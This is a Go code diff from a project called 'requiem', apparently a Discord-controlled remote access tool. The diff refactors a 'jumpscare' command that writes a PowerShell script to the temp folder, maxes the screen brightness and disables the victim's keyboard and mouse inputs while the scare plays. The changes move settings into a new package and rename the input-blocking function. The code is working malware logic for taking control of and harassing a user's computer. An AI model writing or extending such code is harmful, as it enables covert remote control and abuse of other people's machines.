@@ -8,6 +8,7 @@ import (
 	"time"
 
 	"requiem/funcs"
+	"requiem/settings"
 	"requiem/store"
 	"requiem/utils"
 	"requiem/utils/discord"
@@ -34,11 +35,11 @@ func (*ScareCommand) Exec(ctx *store.CommandContext, args []string) {
 	scareName := fmt.Sprintf("%d.ps1", time.Now().UnixNano())
 	scarePath := filepath.Join(os.TempDir(), scareName)
 
-	if store.RuntimeSettings.JumpscareDisableInputsUntilFinished {
-		funcs.DisableInputs(true)
+	if settings.RuntimeSettings.JumpscareDisableInputsUntilFinished {
+		funcs.SetInputsDisabled(true)
 	}
 
-	if store.RuntimeSettings.JumpscareMaxBrightnessBefore {
+	if settings.RuntimeSettings.JumpscareMaxBrightnessBefore {
 		utils.RunCommand(
 			"powershell",
 			"-c",
@@ -78,8 +79,10 @@ func (*ScareCommand) Exec(ctx *store.CommandContext, args []string) {
 
 	time.Sleep(time.Duration(timeout) * time.Millisecond)
 
-	if store.RuntimeSettings.JumpscareDisableInputsUntilFinished {
-		funcs.DisableInputs(true)
+	if settings.RuntimeSettings.JumpscareDisableInputsUntilFinished {
+		// see /bot/commands/input.go @ } else if utils.HasFlag(content, "unblock") {
+		funcs.SetInputsDisabled(true)
+		funcs.SetInputsDisabled(false)
 	}
 }
 
